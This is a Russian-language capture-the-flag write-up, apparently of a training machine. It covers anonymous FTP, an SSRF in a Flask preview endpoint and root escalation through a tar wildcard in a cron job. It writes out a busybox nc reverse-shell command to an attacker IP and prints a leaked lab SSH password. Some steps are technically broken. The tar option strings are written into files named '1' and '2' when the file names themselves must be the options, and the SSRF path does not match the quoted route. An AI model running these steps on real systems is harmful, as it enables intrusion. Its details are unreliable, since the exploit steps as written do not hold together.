# Отчёт о прохождении машины Operation Coldstart
## 1. Общая информация

**Заказчик:** Volt Labs — небольшая компания, подозревающая, что старый staging-сервер стал уязвимым и доступным извне.

**Цель:** Получить доступ к системе, продемонстрировать полную компрометацию сервера.


## 2. Разведка и анализ поверхности атаки

### 2.1 Nmap-скан

```bash
nmap -sV -sC -p- 10.112.161.86
```

Результаты сканирования выявили следующие открытые порты:

- **21/tcp** — FTP (vsftpd 3.0.5) с анонимным доступом
- **22/tcp** — SSH (OpenSSH 9.6p1 Ubuntu)
- **80/tcp** — HTTP (Gunicorn, URL Preview — Volt Labs)

На FTP-сервере разрешён анонимный вход. В директории `pub` обнаружен архив с исходным кодом приложения.


## 3. Анализ исходного кода приложения

### 3.1 Структура приложения

Архив содержит Python-приложение на Flask/Gunicorn. Основные эндпоинты:

- `/preview` — принимает URL, делает запрос и отображает содержимое.
- `/admin` — доступен только с localhost.

**Ключевые фрагменты кода:**

```python
ALLOWED_HOSTS = {"kestrel.thm"}

@app.route("/preview")
def preview():
    target = request.args.get("url")
    host = urlparse(target).hostname
    if host not in ALLOWED_HOSTS:
        return "Host not allowed"
    response = requests.get(target)
    return response.text

@app.route("/admin/")
def admin():
    if not request.remote_addr.startswith("127."):
        abort(403)
    return open("/opt/voltlabs-preview/admin_notes.txt").read()
```

**Выводы:**

- Эндпоинт `/preview` принимает URL и проверяет только `hostname`.
- Если `hostname` совпадает с `kestrel.thm`, запрос отправляется.
- Внутренний хост `kestrel.thm` резолвится в `127.0.0.1` через `/etc/hosts`.
- Эндпоинт `/admin` доступен только с localhost (проверка `request.remote_addr`).


## 4. Эксплуатация SSRF

### 4.1 Добавление записи в `/etc/hosts`

На атакующей машине добавлена запись:

```bash
echo "10.112.161.86 kestrel.thm" >> /etc/hosts
```

### 4.2 Обход ограничений через SSRF

С помощью уязвимости SSRF в эндпоинте `/preview` выполнен запрос к внутреннему админскому пути:

```bash
curl "http://kestrel.thm/preview?url=http://kestrel.thm/admin/notes"
```

Результат:

```
SSH access for staging:
  user: webdev
  pass: V0ltLabs#summer
- Mara
```

**Учётные данные получены.**


## 5. Получение доступа по SSH

С найденными учётными данными выполнено подключение:

```bash
ssh webdev@10.112.161.86
```

В домашней директории пользователя `webdev` найден флаг пользователя.


## 6. Эскалация привилегий

### 6.1 Проверка стандартных векторов

```bash
sudo -l
```

Результат:

```
Sorry, user webdev may not run sudo on coldstart.
```

Cron-задачи (`/etc/crontab`, `cron.d`) пусты. Капабилити не дают быстрого пути к root.

### 6.2 Запуск linpeas

Запущен `linpeas.sh` для автоматического поиска векторов эскалации.

Обнаружена интересная задача в `/etc/cron.d/voltlabs-backup`:

```bash
# Volt Labs staging backup - runs as root
SHELL=/bin/bash
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin

* * * * * root cd /opt/backups && tar czf /var/backups/uploads.tgz *
```

### 6.3 Эксплуатация tar через wildcard

В `tar` есть уязвимость, связанная с обработкой опций через аргументы командной строки. Если в папке, где выполняется `tar *`, есть файлы, начинающиеся с `--`, они интерпретируются как опции.

**Созданы файлы-опции в `/opt/backups`:**

```bash
cd /opt/backups
echo '--checkpoint=1' > 1
echo '--checkpoint-action=exec=busybox nc 192.168.130.144 4444 -e sh' > 2
```

### 6.4 Получение reverse shell

На атакующей машине запущен слушатель:

```bash
nc -lvnp 4444
```

Через ~1 минуту cron выполнил команду, и reverse shell пришёл с правами `root`.

```bash
# id
uid=0(root) gid=0(root) groups=0(root)
```

Root-доступ получен. Флаг на `/root/` извлечён.


## 7. Итог

### 7.1 Цепочка атаки

1. **Разведка:** Nmap → обнаружение FTP с анонимным доступом → скачивание архива с исходным кодом.
2. **Анализ кода:** Выявлены SSRF в `/preview` и ограничение доступа к `/admin` по IP (localhost).
3. **SSRF:** Добавлен хост `kestrel.thm`, выполнен запрос к `/admin/notes` → получены учётные данные `webdev`.
4. **Доступ по SSH:** Вход как `webdev`, флаг пользователя.
5. **Эскалация:** Обнаружена cron-задача с `tar` в `/opt/backups`.
6. **Wildcard-атака на tar:** Созданы файлы-опции `--checkpoint=1` и `--checkpoint-action=exec=...`.
7. **Reverse shell:** Получен shell от `root`, флаг администратора.

### 7.2 Ключевые находки

| Уязвимость | Описание |
|------------|----------|
| **SSRF в /preview** | Проверяется только hostname, нет проверки схемы или пути. |
| **Анонимный FTP** | Доступ к исходному коду приложения. |
| **Wildcard-атака на tar** | Cron-задача архивирует все файлы из `/opt/backups` → подмена опций. |
| **Нет проверки пути в `/preview`** | Доступ к внутренним ресурсам через SSRF. |

### 7.3 Найденные учётные данные

| Пользователь | Пароль | Источник |
|--------------|--------|----------|
| `webdev` | `V0ltLabs#summer` | `/admin/notes` через SSRF |

### 7.4 Достижения и новые навыки

**SSRF (Server-Side Request Forgery)** — использована уязвимость SSRF для обхода ограничений доступа к внутренним эндпоинтам. Добавление записи в `/etc/hosts` позволило обратиться к `kestrel.thm`, который резолвится в `127.0.0.1`, и получить доступ к админским запискам.

**Wildcard-атака на tar** — применена техника эксплуатации cron-задачи с `tar *`. Созданы файлы с именами, начинающимися с `--`, которые интерпретируются как опции `tar`. Использованы `--checkpoint=1` и `--checkpoint-action=exec=...` для выполнения произвольной команды от root.

**Анализ исходного кода через FTP** — получен доступ к исходному коду приложения через анонимный FTP. Изучена логика работы эндпоинтов `/preview` и `/admin`, выявлены ограничения и способы их обхода.

**Использование `busybox nc` для reverse shell** — в условиях ограниченного окружения использован `busybox nc -e sh` для получения обратного соединения.

**Работа с cron-задачами** — идентифицирована задача в `/etc/cron.d/voltlabs-backup`, проанализирована её команда и использован вектор с `tar` для выполнения кода от root.

**Обход проверки IP (localhost)** — использован SSRF для обхода проверки `request.remote_addr.startswith("127.")`, которая в обычных условиях блокирует доступ к `/admin` с внешних IP.
